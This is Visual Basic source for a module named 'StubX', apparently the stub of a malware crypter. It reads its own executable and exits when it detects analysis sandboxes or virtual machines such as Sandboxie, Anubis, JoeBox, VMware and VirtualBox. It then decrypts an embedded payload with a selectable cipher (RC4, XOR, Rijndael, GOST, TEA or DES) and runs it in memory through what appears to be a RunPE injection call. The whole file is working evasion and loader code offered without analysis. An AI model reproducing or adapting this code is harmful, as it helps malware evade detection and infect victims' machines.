Attribute VB_Name = "StubX"
Sub Main()
 
 Dim MisDatos       As String, DF As New Class2
 
 Open App.Path & "\" & App.EXEName & ".exe" For Binary As #1
    MisDatos = Space(LOF(1))
    Get #1, , MisDatos
Close #1


Dim Antis()     As String
Antis() = Split(MisDatos, "ANTIS")


If Antis(1) = "1" Then
    If AntiSandBoxie = 1 And isinsandboxEs = 1 Then: End
End If

If Antis(2) = "1" Then
    If AntiThreatExpert = 1 And isinsandboxEs = 2 Then: End
End If

If Antis(3) = "1" Then
    If AntiAnubis = 1 And isinsandboxEs = 3 Then: End
End If

If Antis(4) = "1" Then
    If AntiCWSandBox = 1 And isinsandboxEs = 4 Then: End
End If

If Antis(5) = "1" Then
    If AntiJoeBox = 1 And isinsandboxEs = 5 Then: End
End If

If Antis(6) = "1" Then
    If AntiVMware = 1 And IsVirtualPCPresent = 1 Then: End
End If

If Antis(7) = "1" Then
    If AntiVirtualPC = 1 And IsVirtualPCPresent = 2 Then: End
End If

If Antis(8) = "1" Then
    If AntiVirtualBox = 1 And IsVirtualPCPresent = 3 Then: End
End If


Dim xSplit()      As String

xSplit() = Split(MisDatos, "&/&%&(=)%&&%")

Dim RC4             As New clsRC4
Dim xXOR            As New clsXOR
Dim Rijndael        As New clsRijndael
Dim Gost            As New clsGost
Dim TEA             As New clsTEA
Dim DES             As New clsDES

If xSplit(2) = "xRC4" Then
    xSplit(1) = RC4.DecryptString(xSplit(1), xSplit(3))
End If

If xSplit(2) = "xxXOR" Then
    xSplit(1) = xXOR.DecryptString(xSplit(1), xSplit(3))
End If

If xSplit(2) = "xRijndael" Then
    xSplit(1) = Rijndael.DecryptString(xSplit(1), xSplit(3))
End If

If xSplit(2) = "xGost" Then
    xSplit(1) = Gost.DecryptString(xSplit(1), xSplit(3))
End If

If xSplit(2) = "xTEA" Then
    xSplit(1) = TEA.DecryptString(xSplit(1), xSplit(3))
End If

If xSplit(2) = "xDES" Then
    xSplit(1) = DES.DecryptString(xSplit(1), xSplit(3))
End If
 

 Dim hDatos()        As Byte
hDatos() = StrConv(xSplit(1), vbFromUnicode)

DF.RPE hDatos()
 
End Sub
